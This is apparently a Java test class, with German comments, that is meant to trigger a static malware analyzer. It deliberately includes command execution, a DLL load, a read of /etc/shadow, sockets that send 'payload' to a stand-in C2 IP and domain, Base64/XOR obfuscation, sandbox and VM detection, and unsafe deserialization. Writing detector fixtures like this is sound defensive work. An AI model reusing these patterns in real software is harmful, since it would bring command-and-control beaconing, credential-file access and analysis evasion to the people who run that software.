package org.example.test;


import java.lang.reflect.Method;

import java.lang.Runtime;


import java.net.Socket;
import javax.crypto.Cipher;
import java.io.ObjectInputStream;
import java.security.MessageDigest;

import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.math.BigInteger;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.Collections;

/**
 * Diese Test-Klasse enthält Muster die im StaticAnalyzer gesucht werden
 */
public class TestClass {


    // Verdächtiges Literal das eine IP-Adresse enthält
    private static final String C2_SERVER_IP = "198.51.100.1";

    // Verdächtiges Literal das einen Domain-Namen enthält
    private static final String C2_SERVER_DOMAIN = "malicious-control-server.com";

    // Eine weitere IP-Adresse
    private final String backupServer = "192.168.1.100";

    // Dieser String ist unbedenklich
    private final String safeString = "This is a normal configuration string.";

    /**
     * Hauptmethode die alle Test-Trigger aufruft
     */
    public static void main(String[] args) {

        TestClass testClass = new TestClass();

        try {
            testClass.triggerForbiddenMethods();
            testClass.triggerSuspiciousFileAccess();
            testClass.triggerNetworkAndCrypto();
            testClass.triggerObfuscation();
            testClass.triggerAntiSandbox();
            testClass.triggerDeserialization(null);
            testClass.triggerCryptominingPattern();
            testClass.triggerReflection();
        } catch (Exception e) {
            // Exceptions für Testzwecke unterdrücken
            System.out.println("An expected error was caught: " + e.getMessage());
        }

        System.out.println("--- Test testClass Complete ---");
    }

    /**
     * Löst Verstöße für das Ausführen von Befehlen und das Laden von Bibliotheken aus
     */
    public void triggerForbiddenMethods() throws IOException {
        System.out.println("Testing forbidden methods...");

        // Methodenaufruf: java.lang.Runtime.exec (Verboten)
        Runtime.getRuntime().exec("calc.exe");

        // Methodenaufruf: java.lang.System.load (Verboten)
        System.load("C:\\temp\\evil.dll");
    }

    /**
     * Löst Verstöße durch den Zugriff auf sensible Systempfade aus
     */
    public void triggerSuspiciousFileAccess() throws IOException {
        System.out.println("Testing suspicious file access...");

        // Dateipfad im Konstruktor: /etc/ (Verdächtig)
        File shadowFile = new File("/etc/shadow");
        shadowFile.canRead();

        // Dateipfad in Methode: c:/windows (Verdächtig)
        Files.write(Paths.get("c:/windows/temp.txt"), Collections.singleton("test"));

        // Verdächtiger Dateipfad im Konstruktor: user.home
        // Der Analyzer prüft auf den exakten String "user.home"
        File userHomeFile = new File("C:/some/path/user.home/config.txt");
        userHomeFile.delete();
    }

    /**
     * Löst Verstöße für Sockets Ciphers und die Verwendung verdächtiger Literale aus
     */
    public void triggerNetworkAndCrypto() throws Exception {
        System.out.println("Testing network and crypto...");

        // Startet eine Socket-Verbindung (Verboten)
        try (Socket socket = new Socket(C2_SERVER_IP, 4444)) {
            socket.getOutputStream().write("payload".getBytes());
        }

        // Eine weitere Socket-Verbindung
        try (Socket socket2 = new Socket(C2_SERVER_DOMAIN, 1337)) {
            socket2.getOutputStream().write("payload".getBytes());
        }

        // Verwendet eine Crypto-Klasse (Verdächtig)
        Cipher.getInstance("AES/ECB/PKCS5Padding");
    }

    /**
     * Löst Verstöße für Base64-Dekodierung und XOR-Schleifen aus
     */
    public void triggerObfuscation() {
        System.out.println("Testing obfuscation techniques...");

        String encoded = "Y2FsYy5leGU="; // "calc.exe"
        // Verwendung von Base64 Decoder (Verdächtig)
        byte[] decoded = Base64.getDecoder().decode(encoded);
        System.out.println("Decoded: " + new String(decoded));

        // Schleife enthält XOR-Operation (Verdächtig)
        byte[] encrypted = {22, 1, 3, 16};
        for (int i = 0; i < encrypted.length; i++) {
            // Diese XOR-Operation sollte erkannt werden
            encrypted[i] = (byte) (encrypted[i] ^ 0x5A);
        }
    }

    /**
     * Löst Verstöße für timing-basierte Umgehung aus
     */
    public void triggerAntiSandbox() {
        System.out.println("Testing anti-sandbox timing...");

        // Methode enthält >= 2 Timing-Aufrufe (Verdächtig)
        long start = System.nanoTime();


        long end = System.nanoTime();
        if (end - start > 1_000_000) { // 1ms
            System.out.println("Debugger detected!");
        }

        // Timing-Aufruf innerhalb einer Schleife (Verdächtig)
        for (int i = 0; i < 10; i++) {
            System.out.println("Looping...");
            if (System.currentTimeMillis() % 1000 == 0) {
                // Das ist ein verdächtiges Muster
            }
        }
    }

    /**
     * Löst Verstöße durch die Verwendung von ObjectInputStream aus
     */
    public void triggerDeserialization(InputStream in) throws Exception {
        System.out.println("Testing deserialization...");

        // Verwendet verdächtige Klasse ObjectInputStream
        if (in != null) {
            ObjectInputStream ois = new ObjectInputStream(in);
            Object obj = ois.readObject();
            System.out.println("Read object: " + obj.toString());
        }
    }

    /**
     * Diese Schleife *sollte* als verdächtig markiert werden da sie Hashing + BigInteger enthält
     */
    public void triggerCryptominingPattern() throws Exception {
        System.out.println("Testing cryptomining loop pattern...");

        MessageDigest md = MessageDigest.getInstance("SHA-256");

        // Diese Schleife enthält MessageDigest- und BigInteger-Operationen
        for (int i = 0; i < 100; i++) {
            String data = "block" + i;
            byte[] hash = md.digest(data.getBytes());
            BigInteger hashInt = new BigInteger(1, hash);
            if (hashInt.bitLength() < 250) {
                System.out.println("Found hash!");
            }
        }
    }

    /**
     * Löst Verstöße durch die Verwendung der importierten verbotenen Klasse aus
     */
    public void triggerReflection() throws Exception {
        System.out.println("Testing reflection usage...");

        // Verwendet verbotene Klasse Method (aus Import)
        Method m = String.class.getMethod("toUpperCase");
        System.out.println(m.invoke("test"));
    }

    /**
     * Löst Verstöße für Fingerprinting und Anti-Analyse aus
     */
    public void triggerFingerprintingEvasion() {
         System.out.println("Testing fingerprinting & evasion...");

         // Zugriff auf verdächtige Property "user.name"
         String username = System.getProperty("user.name");

         // Literal "sandbox" in Vergleich genutzt (Verdächtig)
         if (username != null && username.toLowerCase().equals("sandbox")) {
             System.out.println("Sandbox username detected!");
         }

         // Zugriff auf verdächtige Property "os.name"
         String os = System.getProperty("os.name");
         System.out.println("OS: " + os);

         // Literal "VMWare" genutzt (Verdächtig)
         File vmwareTools = new File("C:\\Program Files\\VMware\\VMware Tools");
         if (vmwareTools.exists()) {
             System.out.println("VMWare detected!");
         }

         // Literal "procmon.exe" genutzt (Verdächtig)
         String toolCheck = "tasklist | findstr procmon.exe";
         try {
             Runtime.getRuntime().exec(toolCheck); // exec wird bereits erkannt
         } catch(IOException e) {}

         // Toter Code-Block (if(false)) (Verdächtig)
         if (false) {
             System.out.println("This should not print.");
         }

    }
}
